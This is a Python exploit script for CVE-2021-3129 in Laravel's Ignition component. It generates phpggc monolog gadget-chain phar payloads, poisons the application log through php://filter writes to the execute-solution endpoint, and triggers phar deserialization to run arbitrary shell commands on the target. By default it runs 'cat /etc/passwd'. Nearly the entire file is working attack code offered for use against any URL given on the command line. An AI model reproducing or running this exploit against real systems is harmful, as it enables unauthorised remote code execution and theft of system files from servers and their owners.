#!/usr/bin/python3
import argparse
import os
import uuid

import requests as req
import urllib3

urllib3.disable_warnings()  # Resolve InsecureRequestWarning warning


class Exp:
    __gadget_chains = {
        "monolog_rce1": r""" php -d 'phar.readonly=0' phpggc/phpggc monolog/rce1 system %s --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt""",
        "monolog_rce2": r""" php -d 'phar.readonly=0' phpggc/phpggc monolog/rce2 system %s --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt""",
        "monolog_rce3": r""" php -d 'phar.readonly=0' phpggc/phpggc monolog/rce3 system %s --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt""",
    }  # phpggc chain collection, temporarily add rce1 and then add other enhanced pass-killing capabilities

    __delimiter_len = 8  # Delimiter length

    def __vul_check(self):
        resp = req.get(self.__url, verify=False)
        if resp.status_code != 405 and "laravel" not in resp.text:
            return False
        return True

    def __payload_send(self, payload):
        header = {
            "Accept": "application/json"
        }
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "cve20213129",
                "viewFile": ""
            }
        }
        data["parameters"]["viewFile"] = payload
        resp = req.post(self.__url, headers=header, json=data, verify=False)
        return resp

    def __command_handler(self, command):
        """
        Because the user command needs to be injected into the command generated by the payload,
        in order to prevent the structure from being affected, some processing is performed.
        """

        self.__delimiter = str(uuid.uuid1())[
                           :self.__delimiter_len]  # The delimiter is used to locate the position of the command execution result on the page.
        command = "echo %s && %s && echo %s" % (self.__delimiter, command, self.__delimiter)

        escaped_chars = [' ', '&', '|']  # I only think of so many, you can add it yourself.
        for c in escaped_chars:
            command = command.replace(c, '\\' + c)
        return command

    def __clear_log(self):
        return self.__payload_send(
            "php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")

    def __gen_payload(self, gadget_chain):
        gen_shell = self.__gadget_chains[gadget_chain] % (self.__command)
        os.system(gen_shell)
        with open('payload.txt', 'r') as f:
            payload = f.read().replace('\n',
                                       '') + 'a'  # Adding a character makes two complete payloads always only one can be decoded normally
        os.system("rm payload.txt")
        return payload

    def __decode_log(self):
        return self.__payload_send(
            "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")

    def __unserialize_log(self):
        return self.__payload_send("phar://../storage/logs/laravel.log/test.txt")

    def __rce(self):
        text = self.__unserialize_log().text
        echo_find = text.find(self.__delimiter)
        if echo_find >= 0:
            return text[echo_find + self.__delimiter_len + 1: text.find(self.__delimiter, echo_find + 1)]

    def exp(self):
        for gadget_chain in self.__gadget_chains.keys():
            print("|")
            self.__clear_log()
            self.__clear_log()
            self.__payload_send('a' * 2)
            self.__payload_send(self.__gen_payload(gadget_chain))
            self.__decode_log()
            print("%s" % self.__rce())

    def __init__(self, target, command):
        self.target = target
        self.__url = req.compat.urljoin(target, "_ignition/execute-solution")
        self.__command = self.__command_handler(command)
        if not self.__vul_check():
            print("[-] %s is not vulnerable." % (self.target))
        else:
            self.exp()


def main(url):
    Exp(url, "cat /etc/passwd")  # target and command


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('address', help='address [url: http://donki.xyz/ or domain: donki.xyz]', type=str)
    args = parser.parse_args()
    main(args.address)
